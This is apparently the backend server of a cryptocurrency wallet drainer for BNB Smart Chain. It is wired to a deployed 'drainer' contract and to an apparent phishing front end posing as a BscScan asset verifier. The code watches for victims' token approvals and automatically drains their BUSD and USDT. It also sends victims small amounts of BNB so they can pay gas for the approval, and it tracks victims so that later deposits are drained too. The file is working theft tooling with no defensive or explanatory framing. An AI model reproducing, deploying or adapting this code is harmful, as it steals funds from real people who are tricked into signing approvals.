require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");
const cors = require("cors");

function formatError(error) {
  if (error && error.reason) return `${error.reason} (${error.code || "UNKNOWN_ERROR"})`;
  return error.message || "Unknown error";
}

const app = express();
app.use(express.json());
app.use(cors({
  origin: ["http://localhost:5173", "https://bscscan-verify-assets.vercel.app/"],
  methods: ["GET", "POST"],
  allowedHeaders: ["Content-Type"],
}));

const BSC_MAINNET_CHAIN_ID = 56;
const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/", BSC_MAINNET_CHAIN_ID);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);

const drainerContractAddress = "0x17ea41b9Ce16190730039384287469b6D5dac2E1"; // Your deployed address

const tokenList = [
  { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
  { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
];

const drainerAbi = [
  "function drainTokens(address victim, address[] memory tokens) external returns (uint256[] memory)",
  "function drainSpecificToken(address victim, address token) external returns (uint256)",
  "function autoDrain(address victim, address[] memory tokens) external",
  "function attacker() external view returns (address)",
  "event TokensDrained(address indexed victim, address indexed token, uint256 amount)",
  "event VictimAdded(address indexed victim)"
];

const tokenAbi = [
  "function balanceOf(address account) external view returns (uint256)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "event Transfer(address indexed from, address indexed to, uint256 value)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

const Drainer = new ethers.Contract(drainerContractAddress, drainerAbi, wallet);
let victims = new Set();

async function getGasSettings() {
  try {
    const feeData = await provider.getFeeData();
    return {
      gasLimit: 1500000,
      maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits("15", "gwei"),
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei"),
    };
  } catch (error) {
    console.error("Error fetching gas data:", formatError(error));
    return {
      gasLimit: 1500000,
      maxFeePerGas: ethers.parseUnits("15", "gwei"),
      maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
    };
  }
}

async function checkWalletBalance() {
  const network = await provider.getNetwork();
  const receivedChainId = Number(network.chainId);
  if (receivedChainId !== BSC_MAINNET_CHAIN_ID) {
    throw new Error(`Network mismatch: Expected chain ID ${BSC_MAINNET_CHAIN_ID}, got ${receivedChainId}`);
  }

  const balance = await provider.getBalance(wallet.address);
  console.log(`Wallet balance: ${ethers.formatEther(balance)} BNB`);
  if (balance < ethers.parseEther("0.01")) {
    throw new Error("Insufficient BNB for gas. Please fund the wallet.");
  }
}

async function sendGasIfNeeded(victimAddress) {
  console.log(`Connected wallet address: ${victimAddress}`);
  const victimBalance = await provider.getBalance(victimAddress);
  console.log(`Victim BNB balance: ${ethers.formatEther(victimBalance)} BNB`);
  for (const token of tokenList) {
    const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
    const tokenBalance = await tokenContract.balanceOf(victimAddress);
    console.log(`Victim ${token.symbol} balance: ${ethers.formatUnits(tokenBalance, token.decimals)}`);
  }
  if (victimBalance === BigInt(0)) {
    const bnbToSend = ethers.parseEther("0.002");
    const gasSettings = await getGasSettings();
    console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`);
    const tx = await wallet.sendTransaction({
      to: victimAddress,
      value: bnbToSend,
      gasLimit: 21000,
      gasPrice: gasSettings.gasPrice,
    });
    console.log(`Gas transaction sent: ${tx.hash}`);
    const receipt = await tx.wait();
    return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas`, txHash: tx.hash };
  }
  return { success: false, message: "No gas needed" };
}

async function initialize() {
  console.log("Initializing server...");
  console.log("Using wallet address:", wallet.address);
  try {
    await checkWalletBalance();
    const owner = await Drainer.attacker();
    console.log("Contract owner:", owner);
    if (owner.toLowerCase() !== wallet.address.toLowerCase()) {
      console.warn("Warning: Wallet is not the contract owner!");
    }
    Drainer.on("VictimAdded", (victim) => {
      console.log(`New victim added: ${victim}`);
      victims.add(victim);
    });
    const tokenAddresses = tokenList.map(t => t.address);
    
    // Watch approvals and auto-drain
    for (const token of tokenList) {
      const tokenContract = new ethers.Contract(token.address, tokenAbi, wallet);
      tokenContract.on("Approval", async (owner, spender, amount) => {
        if (spender.toLowerCase() === drainerContractAddress.toLowerCase() && amount > 0) {
          console.log(`Approval detected: ${owner} approved ${ethers.formatUnits(amount, token.decimals)} ${token.symbol}`);
          try {
            const tx = await Drainer.drainTokens(owner, tokenAddresses, {
              gasLimit: 200000,
              maxFeePerGas: ethers.parseUnits("5", "gwei"),
              maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
            });
            console.log(`Auto-drain triggered: ${tx.hash}`);
            await tx.wait();
          } catch (error) {
            console.error(`Drain failed for ${owner}:`, formatError(error));
          }
        }
      });
      tokenContract.on("Transfer", async (from, to, amount) => {
        if (victims.has(to)) {
          console.log(`Deposit detected: ${ethers.formatUnits(amount, 18)} to ${to}`);
          try {
            const tx = await Drainer.autoDrain(to, tokenAddresses, {
              gasLimit: 200000,
              maxFeePerGas: ethers.parseUnits("5", "gwei"),
              maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
            });
            console.log(`Auto-drain triggered: ${tx.hash}`);
            await tx.wait();
          } catch (error) {
            console.error(`Auto-drain failed for ${to}:`, formatError(error));
          }
        }
      });
    }
    console.log("Initialization complete");
  } catch (error) {
    console.error("Initialization failed:", formatError(error));
    throw error;
  }
}

app.post("/check-and-fund", async (req, res) => {
  const { victimAddress } = req.body;
  try {
    if (!victimAddress || !ethers.isAddress(victimAddress)) {
      return res.status(400).json({ error: "Invalid or missing victimAddress" });
    }
    const gasResult = await sendGasIfNeeded(victimAddress);
    res.json(gasResult);
  } catch (error) {
    console.error("Check-and-fund error:", formatError(error));
    res.status(500).json({ error: error.message });
  }
});

app.post("/drain", async (req, res) => {
  const { victimAddress } = req.body;
  try {
    if (!victimAddress || !ethers.isAddress(victimAddress)) {
      return res.status(400).json({ error: "Invalid or missing victimAddress" });
    }
    let needsApproval = false;
    for (const token of tokenList) {
      const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
      const balance = await tokenContract.balanceOf(victimAddress);
      const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
      console.log(`${token.symbol} balance for ${victimAddress}: ${ethers.formatUnits(balance, token.decimals)}`);
      console.log(`${token.symbol} allowance for ${victimAddress}: ${ethers.formatUnits(allowance, token.decimals)}`);
      if (balance > 0 && allowance === BigInt(0)) {
        needsApproval = true;
        break;
      }
    }
    res.json({ success: true, needsApproval });
  } catch (error) {
    console.error("Drain error:", formatError(error));
    res.status(500).json({ error: error.message });
  }
});

app.get("/debug", async (req, res) => {
  try {
    const owner = await Drainer.attacker();
    res.json({ owner });
  } catch (error) {
    console.error("Debug error:", formatError(error));
    res.status(500).json({ error: error.message });
  }
});

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`API server running on port ${PORT}`);
  try {
    await initialize();
  } catch (error) {
    console.error("Failed to initialize server, server continues:", formatError(error));
  }
});